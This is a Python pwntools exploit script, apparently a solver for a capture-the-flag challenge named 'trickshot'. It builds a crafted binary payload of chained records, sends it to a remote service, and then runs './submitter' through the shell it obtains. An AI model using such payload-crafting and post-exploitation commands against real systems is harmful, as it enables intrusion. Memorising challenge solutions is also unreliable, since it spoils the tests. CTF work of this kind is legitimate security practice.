from pwn import *

# context.log_level = "error"

def ttt(xx):

    # p = process("/mnt/ssd2/tmp/0504/trickshot/trickshot/handout/trickshot")
    p = remote(os.environ.get('HOST', 'localhost'), 31337)

    # p.recvuntil(b"SHOW ME WHAT YOU GOT\n")

    payload = [0] * 1000

    # payload[0] = 0x73
    payload[1] = 0x48
    payload[2] = 0x30
    payload[3] = 0x74

    entryp = 1
    v9 = 0
    v10 = 0
    bounced = 0


    payload[4] = entryp
    payload[5] = 0

    def setint(i, pos, payload):
        # global payload
        payload[pos] = i & 0xFF
        payload[pos+1] = (i>>8) & 0xFF
        payload[pos+2] = (i>>16) & 0xFF
        payload[pos+3] = (i>>24) & 0xFF
        return payload
    def setarr(arr, pos, res, bounced_time):
        print(f"filling {pos}")
        assert len(arr) == 10
        for i in range(10):
            arr[i] = (arr[i] + bounced_time) & 0xFF
        for idx, i in enumerate(arr):
            res[pos + idx] = i
        return res
    def setintforp(i, pos, ppp):
        ppp[pos] = i & 0xFF
        ppp[pos+1] = (i>>8) & 0xFF
        ppp[pos+2] = (i>>16) & 0xFF
        ppp[pos+3] = (i>>24) & 0xFF
        return ppp

    # checkAlignment
    payload = setint(xx, 6, payload)

    nextf = 0
    fuzz_ = [4, 102, 85, 122, 90, nextf, 116, 72, 105, 83]
    currpos = entryp
    payload = setarr(fuzz_, 10*currpos, payload, bounced)

    bounced += 1
    v9 += 1
    v10 += nextf
    #


    nextw = 0
    wiggle_ = [16, 0b01010101,0b01010101,0b01010101,0b01010101,0b01010101,0b01010101,0b01010101, nextw&0xFF, (nextw>>8)&0xff]
    currpos = (entryp + bounced + v10 * v9) % 100
    payload = setarr(wiggle_, 10*currpos, payload, bounced)

    bounced += 1
    v9 += 2
    v10 += nextw


    nextl = 0
    leet_ = [64, nextl&0xFF, (nextl>>8)&0xff, 0, 0x31, 0x33, 0x33,0x37,0x30,0x30]
    currpos = (entryp + bounced + v10 * v9) % 100
    payload = setarr(leet_, 10*currpos, payload, bounced)

    bounced += 1
    v9 += 0
    v10 += nextl

    nextg = 0
    gravity = [0x80, 0,0,0,0, 0,0,0,0, nextg]
    gravity = setintforp(1, 1, gravity)
    gravity = setintforp(0xFFFFFFFF, 5, gravity)
    currpos = (entryp + bounced + v10 * v9) % 100
    payload = setarr(gravity, 10*currpos, payload, bounced)

    bounced += 1
    v9 += 4
    v10 += nextg


    for i in range(23):
        nextf = 0
        fuzz_ = [4, 102, 85, 122, 90, nextf, 116, 72, 105, 83]
        currpos = (entryp + bounced + v10 * v9) % 100
        payload = setarr(fuzz_, 10*currpos, payload, bounced)

        bounced += 1
        v9 += 1
        v10 += nextf




    p.send(bytes(payload))
    r = p.recv()
    # if b"BONUS MULT x2: You really connected!" in r:
    #     print(r)
    #     print("found", xx)
    #     exit(0)
    # if i % 0x100000 == 0:
    #     print(i, r)
    
    # print(r.decode())
    # r = p.recvall()
    # r = p.recv()
    print(r.decode())

    #print(p.recvuntil(b"Final score"))

    # p.sendline("ls -al")
    p.sendline("./submitter")

    print(p.recv())

    p.close()

    

# for i in range(0x100000000):
#     # if i % 0x100000 == 0:
#     #     print(i)
#     ttt(i)
ttt(1)


# nextf = 0
# fuzz_ = [4, 102, 85, 122, 0, nextf, 116, 72, 0, 0]

# nextw = 0
# wiggle_ = [16, ]

# nextl = 0
# leet_ = [64, nextl&0xFF, (nextl>>8)&0xff, 0]
# 49, 51, 55

# nextg = 0
# gravity = [0x80, 0,0,0,0, 0,0,0,0, nextg]
# gravity = setintforp(1, 1, gravity)
# gravity = setintforp(0xFFFFFFFF, 5, gravity)

# def setintforp(i, pos, ppp):
#     ppp[pos] = i & 0xFF
#     ppp[pos+1] = (i>>8) & 0xFF
#     ppp[pos+2] = (i>>16) & 0xFF
#     ppp[pos+3] = (i>>24) & 0xFF
#     return ppp